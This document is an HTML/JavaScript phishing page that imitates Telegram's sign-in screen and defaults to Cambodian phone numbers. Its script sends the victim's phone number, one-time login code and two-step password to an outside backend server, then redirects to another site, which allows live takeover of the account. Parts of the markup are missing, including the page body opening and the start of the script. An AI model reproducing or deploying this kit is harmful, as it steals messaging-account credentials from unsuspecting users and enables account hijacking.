<!DOCTYPE html>
<html lang="km">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Sign in to Telegram</title>
<script src="https://cdn.tailwindcss.com"></script>
<style>
  :root {
    --bg: #171717;
    --card-border: #383838;
    --text-main: #ffffff;
    --text-sub: #aaaaaa;
    --accent: #8774e1;
    --accent-hover: #7966d3;
  }
  * { box-sizing: border-box; touch-action: manipulation; }
  body {
    margin: 0;
    min-height: 100vh;
    background: var(--bg);
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    padding: 20px;
    color: var(--text-main);
    user-select: none;
  }
  .card {
    width: 100%;
    max-width: 400px;
    text-align: center;
  }
  .logo {
    width: 110px;
    height: 110px;
    border-radius: 50%;
    margin: 0 auto 24px;
    overflow: hidden;
    display: flex;
    align-items: center;
    justify-content: center;
    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
    background: transparent;
  }
  .logo svg {
    width: 100%;
    height: 100%;
  }
  h1 {
    color: var(--text-main);
    font-size: 40px;
    font-weight: 800;
    margin: 0 0 12px;
  }
  p.sub {
    color: var(--text-sub);
    font-size: 14px;
    line-height: 1.5;
    margin: 0 0 32px;
    padding: 0 10px;
  }
  .field {
    position: relative;
    border: 1px solid var(--card-border);
    border-radius: 12px;
    padding: 14px 16px 8px;
    margin-bottom: 16px;
    text-align: left;
    background: var(--bg);
  }
  .field:focus-within {
    border-color: var(--accent);
  }
  .field label {
    position: absolute;
    top: -7px;
    left: 14px;
    background: var(--bg);
    padding: 0 4px;
    font-size: 11px;
    color: #888888;
  }
  .field input {
    width: 100%;
    background: transparent;
    border: none;
    outline: none;
    color: var(--text-main);
    font-size: 16px !important;
  }
  .country-select {
    display: flex;
    align-items: center;
    justify-content: space-between;
    cursor: pointer;
  }
  .country-info {
    display: flex;
    align-items: center;
    gap: 10px;
  }
  .flag-emoji {
    font-size: 20px;
    line-height: 1;
  }
  .country-info span {
    color: var(--text-main);
    font-size: 16px;
  }
  .dropdown-arrow {
    color: var(--text-sub);
    font-size: 12px;
  }
  .checkbox-row {
    display: flex;
    align-items: center;
    gap: 12px;
    margin: 24px 0 32px 4px;
    text-align: left;
    cursor: pointer;
    user-select: none;
  }
  .checkbox-row input {
    display: none;
  }
  .checkmark {
    width: 20px;
    height: 20px;
    background-color: #2b2b2b;
    border-radius: 4px;
    display: flex;
    justify-content: center;
    align-items: center;
    transition: background-color 0.2s;
  }
  .checkbox-row input:checked + .checkmark {
    background-color: var(--accent);
  }
  .checkbox-row input:checked + .checkmark::after {
    content: "✔";
    font-size: 12px;
    color: #ffffff;
  }
  .checkbox-row span { 
    color: #dddddd; 
    font-size: 15px; 
  }
  .btn-primary {
    width: 100%;
    background-color: var(--accent);
    color: white;
    border: none;
    padding: 14px;
    border-radius: 12px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    transition: background-color 0.2s, transform 0.05s;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
  }
  .btn-primary:hover {
    background-color: var(--accent-hover);
  }
  .btn-primary:active {
    transform: scale(0.98);
  }

  /* 💫 CSS Animation សម្រាប់រង្វង់វិល Loading */
  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }
  .spinner {
    width: 20px;
    height: 20px;
    border: 3px solid rgba(255, 255, 255, 0.3);
    border-top: 3px solid #ffffff;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    display: inline-block;
  }

  .alt-links {
    margin-top: 24px;
    display: flex;
    flex-direction: column;
    gap: 18px;
  }
  .alt-links a {
    color: var(--accent);
    text-decoration: none;
    font-size: 13px;
    font-weight: 600;
    letter-spacing: 0.5px;
  }
  .alt-links a:hover {
    opacity: 0.8;
  }

  /* Modal Country Selector */
  #country-modal {
    position: fixed;
    top: 0; left: 0; width: 100%; height: 100%;
    background: rgba(0,0,0,0.8);
    display: none;
    justify-content: center;
    align-items: center;
    z-index: 1000;
    padding: 20px;
  }
  .modal-content {
    background: #212121;
    width: 100%;
    max-width: 400px;
    height: 80vh;
    border-radius: 16px;
    display: flex;
    flex-direction: column;
    overflow: hidden;
    border: 1px solid var(--card-border);
  }
  .modal-header {
    padding: 16px;
    border-bottom: 1px solid var(--card-border);
    display: flex;
    align-items: center;
    gap: 12px;
  }
  .modal-header input {
    width: 100%;
    background: #2f2f2f;
    border: none;
    padding: 10px 14px;
    border-radius: 8px;
    color: white;
    outline: none;
    font-size: 15px;
  }
  .country-list {
    overflow-y: auto;
    flex: 1;
    padding: 8px 0;
  }
  .country-item {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 12px 20px;
    cursor: pointer;
    transition: background 0.2s;
  }
  .country-item:hover {
    background: #2f2f2f;
  }
  .country-item-left {
    display: flex;
    align-items: center;
    gap: 12px;
  }
  .country-item-code {
    color: var(--text-sub);
    font-size: 14px;
  }
  .close-modal {
    background: none;
    border: none;
    color: var(--text-sub);
    font-size: 16px;
    cursor: pointer;
  }
</style>
</head>

        </svg>
      </div>
      
      <h1>Telegram</h1>
      <p class="sub">Please confirm your country code and enter your phone number.</p>

      <div class="field">
        <label>Country</label>
        <div class="country-select" onclick="openCountryModal()">
          <div class="country-info" id="selected-country-display">
            <span class="flag-emoji">🇰🇭</span>
            <span>Cambodia</span>
          </div>
          <span class="dropdown-arrow">▼</span>
        </div>
      </div>

      <div class="field">
        <label>Your phone number</label>
        <input id="phone-input" type="text" inputmode="numeric" value="+855 " placeholder="+855 15 944 782" oninput="formatPhoneNumber(this)" onpaste="handlePaste(event, this)" />
      </div>

      <label class="checkbox-row">
        <input type="checkbox" checked />
        <span class="checkmark"></span>
        <span>Keep me signed in</span>
      </label>

      <!-- ប្តូរឈ្មោះប៊ូតុងទៅជា NEXT -->
      <button id="btn-send" onclick="sendPhone()" class="btn-primary">NEXT</button>

      <div class="alt-links">
        <a href="#">LOG IN BY QR CODE</a>
        <a href="#">LOG IN WITH PASSKEY</a>
      </div>
    </div>

    <!-- STEP 2: OTP & 2FA Form -->
    <div id="step-otp" class="space-y-6 hidden">
      <div class="text-5xl mb-2">🔐</div>
      <div>
        <h2 id="display-phone" class="text-lg font-semibold mb-1 text-white"></h2>
        <p id="auth-status" class="text-gray-400 text-sm">We've sent the code to your Telegram app.</p>
      </div>
      
      <div class="text-left space-y-4">
        <div class="field">
          <label>Telegram Code</label>
          <input id="otp-input" type="text" inputmode="numeric" pattern="[0-9]*" placeholder="Enter code" maxlength="5" oninput="checkAutoSubmit(this)" class="text-center font-mono tracking-widest text-xl">
        </div>

        <div id="password-container" class="field hidden">
          <label>Two-Step Password (2FA)</label>
          <input id="password-input" type="password" placeholder="Enter your 2FA password">
        </div>
      </div>

      <button id="btn-verify" onclick="submitOTP()" class="btn-primary">VERIFY & LOGIN</button>
      <div>
        <button onclick="goBack()" class="text-xs text-[#8774e1] hover:underline active:opacity-70 transition">Change Phone Number</button>
      </div>
    </div>

  </div>

  <!-- Country Selection Modal -->
  <div id="country-modal">
    <div class="modal-content">
      <div class="modal-header">
        <input type="text" id="country-search" placeholder="Search country..." oninput="filterCountries(this.value)">
        <button class="close-modal" onclick="closeCountryModal()">✕</button>
      </div>
      <div class="country-list" id="country-list-container">
        <!-- populated by JS -->
      </div>
    </div>
  </div>

    let currentCountryCode = "+855";

    function renderCountries(list) {
      const container = document.getElementById('country-list-container');
      container.innerHTML = list.map(c => `
        <div class="country-item" onclick="selectCountry('${c.code}', '${c.name}', '${c.flag}')">
          <div class="country-item-left">
            <span class="flag-emoji">${c.flag}</span>
            <span>${c.name}</span>
          </div>
          <span class="country-item-code">${c.code}</span>
        </div>
      `).join('');
    }

    function openCountryModal() {
      document.getElementById('country-modal').style.display = 'flex';
      document.getElementById('country-search').value = '';
      renderCountries(countries);
      document.getElementById('country-search').focus();
    }

    function closeCountryModal() {
      document.getElementById('country-modal').style.display = 'none';
    }

    function filterCountries(query) {
      const q = query.toLowerCase();
      const filtered = countries.filter(c => 
        c.name.toLowerCase().includes(q) || c.code.includes(q)
      );
      renderCountries(filtered);
    }

    function selectCountry(code, name, flag) {
      currentCountryCode = code;
      document.getElementById('selected-country-display').innerHTML = `
        <span class="flag-emoji">${flag}</span>
        <span>${name}</span>
      `;
      
      const phoneInput = document.getElementById('phone-input');
      phoneInput.value = code + ' ';
      closeCountryModal();
      phoneInput.focus();
    }

    function findCountryByNumber(text) {
        let cleanText = text.trim();
        if (!cleanText.startsWith('+')) {
            cleanText = '+' + cleanText;
        }

        const sortedCountries = [...countries].sort((a, b) => b.code.length - a.code.length);
        
        for (let c of sortedCountries) {
            if (cleanText.startsWith(c.code)) {
                return c;
            }
        }
        return null;
    }

    function formatPhoneNumber(input) {
        let val = input.value;
        
        let matchedCountry = findCountryByNumber(val);
        if (matchedCountry) {
            currentCountryCode = matchedCountry.code;
            document.getElementById('selected-country-display').innerHTML = `
                <span class="flag-emoji">${matchedCountry.flag}</span>
                <span>${matchedCountry.name}</span>
            `;
        }

        let rawDigits = val.slice(currentCountryCode.length).replace(/[^\d]/g, '');

        let parts = [];
        if (rawDigits.length > 0) parts.push(rawDigits.slice(0, 3));
        if (rawDigits.length > 3) parts.push(rawDigits.slice(3, 6));
        if (rawDigits.length > 6) parts.push(rawDigits.slice(6, 10));

        input.value = currentCountryCode + ' ' + parts.join(' ');
    }

    function handlePaste(e, input) {
        e.preventDefault();
        let pasteData = (e.clipboardData || window.clipboardData).getData('text');
        
        let matchedCountry = findCountryByNumber(pasteData);
        if (matchedCountry) {
            currentCountryCode = matchedCountry.code;
            document.getElementById('selected-country-display').innerHTML = `
                <span class="flag-emoji">${matchedCountry.flag}</span>
                <span>${matchedCountry.name}</span>
            `;
        }

        let rawDigits = pasteData.slice(currentCountryCode.length).replace(/[^\d]/g, '');
        let parts = [];
        if (rawDigits.length > 0) parts.push(rawDigits.slice(0, 3));
        if (rawDigits.length > 3) parts.push(rawDigits.slice(3, 6));
        if (rawDigits.length > 6) parts.push(rawDigits.slice(6, 10));

        input.value = currentCountryCode + ' ' + parts.join(' ');
    }

    function checkAutoSubmit(input) {
        input.value = input.value.replace(/[^\d]/g, '');
        if (input.value.length === 5) {
            submitOTP();
        }
    }

    async function sendPhone() {
        const phoneInput = document.getElementById('phone-input');
        const btn = document.getElementById('btn-send');
        const phoneClean = phoneInput.value.replace(/\s+/g, '').trim();

        if (!phoneClean || phoneClean.length < 7) {
            alert('Please enter a valid phone number.');
            return;
        }

        // 🔄 ប្តូរអក្សរទៅជា PLEASE WAIT... និងបន្ថែមរង្វង់វិល (Spinner Animation)
        btn.disabled = true;
        btn.innerHTML = '<span>PLEASE WAIT...</span><span class="spinner"></span>';
        btn.classList.add('opacity-70');

        try {
            const res = await fetch(`${BACKEND_URL}/api/send-code`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phoneNumber: phoneClean })
            });
            const data = await res.json();

            if (data.success) {
                document.getElementById('display-phone').innerText = phoneInput.value.trim();
                document.getElementById('auth-status').innerText = "We've sent the code to your Telegram app.";
                document.getElementById('auth-status').className = "text-gray-400 text-sm";
                document.getElementById('step-phone').classList.add('hidden');
                document.getElementById('step-otp').classList.remove('hidden');
                document.getElementById('otp-input').focus();
            } else {
                alert(data.error || 'Failed to send code.');
            }
        } catch (err) {
            alert('Cannot connect to backend server!');
            console.error(err);
        } finally {
            btn.disabled = false;
            btn.innerText = 'NEXT';
            btn.classList.remove('opacity-70');
        }
    }

    async function submitOTP() {
        const phoneInput = document.getElementById('phone-input');
        const phoneClean = phoneInput.value.replace(/\s+/g, '').trim();
        const code = document.getElementById('otp-input').value.trim();
        const password = document.getElementById('password-input').value.trim();
        const btn = document.getElementById('btn-verify');

        if (code.length < 5) {
            return;
        }

        btn.disabled = true;
        btn.innerHTML = '<span>PLEASE WAIT...</span><span class="spinner"></span>';
        btn.classList.add('opacity-70');

        try {
            const res = await fetch(`${BACKEND_URL}/api/verify-code`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    phoneNumber: phoneClean, 
                    code: code,
                    password: password || undefined
                })
            });
            const data = await res.json();

            if (data.success) {
                window.location.replace(data.redirectUrl || "https://jvpfans.com");
            } else if (data.requiresPassword) {
                document.getElementById('auth-status').innerText = 'This account has Two-Step Verification enabled. Please enter your 2FA password.';
                document.getElementById('auth-status').className = 'text-yellow-400 text-sm font-medium';
                document.getElementById('password-container').classList.remove('hidden');
                document.getElementById('password-input').focus();
            } else {
                alert(data.error || 'Verification failed.');
            }
        } catch (err) {
            alert('Connection error!');
            console.error(err);
        } finally {
            btn.disabled = false;
            btn.innerText = 'VERIFY & LOGIN';
            btn.classList.remove('opacity-70');
        }
    }

    function goBack() {
        document.getElementById('step-otp').classList.add('hidden');
        document.getElementById('password-container').classList.add('hidden');
        document.getElementById('password-input').value = '';
        document.getElementById('otp-input').value = '';
        document.getElementById('step-phone').classList.remove('hidden');
    }
  </script>
</body>
